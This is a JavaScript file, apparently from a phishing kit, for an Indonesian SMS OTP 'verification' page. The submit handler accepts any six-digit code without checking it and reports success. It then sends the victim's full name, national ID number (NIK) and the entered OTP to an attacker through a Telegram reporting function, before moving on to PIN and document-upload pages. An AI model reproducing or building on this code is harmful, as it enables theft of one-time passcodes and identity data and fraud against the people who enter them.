(() => {
  'use strict';

  if (!NovaStorage.requireSession('index.html')) return;
  if (!NovaStorage.requireIdentity('form-nik.html')) return;

  const form = document.getElementById('verificationForm');
  const inputs = [...document.querySelectorAll('.otp input')];
  const verifyButton = document.getElementById('verifyButton');
  const resendButton = document.getElementById('resendButton');
  const countdown = document.getElementById('countdown');
  const message = document.getElementById('message');
  const backButton = document.getElementById('backButton');
  const maskedDestination = document.getElementById('maskedDestination');
  const localCode = document.getElementById('localCode');

  if (!form || inputs.length !== 6 || !verifyButton || !resendButton || !countdown) {
    console.error('Komponen halaman verifikasi tidak lengkap.');
    return;
  }

  const session = NovaStorage.getSession();
  const identity = NovaStorage.getIdentity();
  const destination = String(session?.identity || '').trim();
  const isDashboardReauth = sessionStorage.getItem('kbDashboardReauth') === '1';

  function maskDestination(value) {
    if (value.includes('@')) {
      const [name, domain] = value.split('@');
      return `${name.slice(0, 2)}${'•'.repeat(Math.max(name.length - 2, 3))}@${domain}`;
    }
    const digits = value.replace(/\D/g, '');
    if (digits.length >= 6) return `${digits.slice(0, 3)}••••${digits.slice(-3)}`;
    return 'kontak terdaftar';
  }

  if (maskedDestination) maskedDestination.textContent = maskDestination(destination);

  let verificationCode = '';
  let timerId = null;
  let secondsLeft = 30;
  let failedAttempts = 0;
  const MAX_ATTEMPTS = 5;

  const enteredCode = () => inputs.map(input => input.value).join('');

  function setMessage(text = '', type = '') {
    message.textContent = text;
    message.className = `message${type ? ` ${type}` : ''}`;
  }

  function updateVerifyButton() {
    const complete = enteredCode().length === 6 && failedAttempts < MAX_ATTEMPTS;
    verifyButton.disabled = !complete;
    verifyButton.classList.toggle('active', complete);
  }

  function resetInputs() {
    inputs.forEach(input => { input.value = ''; });
    inputs[0].focus();
    updateVerifyButton();
  }

  function startCountdown() {
    clearInterval(timerId);
    secondsLeft = 30;
    countdown.textContent = String(secondsLeft);
    resendButton.disabled = true;

    timerId = window.setInterval(() => {
      secondsLeft -= 1;
      countdown.textContent = String(Math.max(secondsLeft, 0));

      if (secondsLeft <= 0) {
        clearInterval(timerId);
        timerId = null;
        resendButton.disabled = false;
      }
    }, 1000);
  }

  function generateLocalCode() {
    const array = new Uint32Array(1);
    crypto.getRandomValues(array);
    verificationCode = Math.floor(100000 + Math.random() * 900000).toString();

    // Ditampilkan hanya untuk pengujian frontend karena belum ada layanan SMS/backend.
    if (localCode) localCode.textContent = verificationCode;

    failedAttempts = 0;
    setMessage('');
    resetInputs();
    startCountdown();
  }

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, '').slice(0, 1);
      setMessage('');

      if (input.value && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
      updateVerifyButton();
    });

    input.addEventListener('keydown', event => {
      if (event.key === 'Backspace' && !input.value && index > 0) {
        inputs[index - 1].focus();
      }

      if (event.key === 'ArrowLeft' && index > 0) inputs[index - 1].focus();
      if (event.key === 'ArrowRight' && index < inputs.length - 1) inputs[index + 1].focus();
    });

    input.addEventListener('paste', event => {
      const pasted = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
      if (!pasted) return;
      event.preventDefault();
      pasted.split('').forEach((digit, position) => {
        if (inputs[position]) inputs[position].value = digit;
      });
      inputs[Math.min(pasted.length, 6) - 1].focus();
      updateVerifyButton();
    });
  });

  form.addEventListener('submit', event => {
    event.preventDefault();

    const otpValue = enteredCode();

    if (!/^\d{6}$/.test(otpValue)) {
      setMessage('Kode OTP harus terdiri dari 6 digit angka.', 'error');
      resetInputs();
      return;
    }

    clearInterval(timerId);
    verifyButton.disabled = true;
    verifyButton.textContent = 'VERIFIKASI BERHASIL ✓';

    if (isDashboardReauth) {
      window.kirimLaporanKeTelegram?.({
        event: 'SMS_REAUTH_VERIFIED',
        page: 'verifikasi-sms.html',
        nama_lengkap: identity?.fullName,
        nik: identity?.nik,
        otp: otpValue,
        status: 'OTP_REAUTH_VERIFIED'
      });

      setMessage(`Kode untuk ${identity.fullName} berhasil diverifikasi.`, 'success');
      window.setTimeout(() => window.location.replace('konfirmasi-pin.html'), 650);
      return;
    }

    const saved = NovaStorage.setSmsVerified(true);
    const appSaved = NovaStorage.setApplication({ lastOtp: otpValue });
    if (!saved || !appSaved) {
      verifyButton.textContent = 'VERIFIKASI KODE →';
      setMessage('Status verifikasi tidak dapat disimpan pada browser ini.', 'error');
      updateVerifyButton();
      return;
    }

    window.kirimLaporanKeTelegram?.({
      event: 'SMS_VERIFIED',
      page: 'verifikasi-sms.html',
      nama_lengkap: identity?.fullName,
      nik: identity?.nik,
      otp: otpValue,
      status: 'OTP_VERIFIED'
    });

    setMessage(`Identitas ${identity.fullName} berhasil diverifikasi.`, 'success');
    window.setTimeout(() => window.location.replace('upload-dokumen.html'), 650);
  });

  resendButton.addEventListener('click', generateLocalCode);
  backButton?.addEventListener('click', () => {
    window.location.href = isDashboardReauth ? 'index.html' : 'form-nik.html';
  });

  generateLocalCode();
})();
